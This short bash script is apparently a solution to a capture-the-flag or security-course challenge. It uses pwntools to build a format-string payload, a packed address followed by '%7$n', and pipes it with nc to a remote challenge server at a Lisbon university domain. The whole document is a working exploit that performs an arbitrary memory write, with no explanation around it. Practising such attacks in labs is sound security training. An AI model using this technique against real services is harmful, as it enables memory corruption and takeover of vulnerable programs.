#!/bin/bash

python3 -c "import sys; from pwn import *; sys.stdout.buffer.write(p32(0x804a040) + b'%7\$n' + b'\n')" | nc mustard.stt.rnl.tecnico.ulisboa.pt 22192
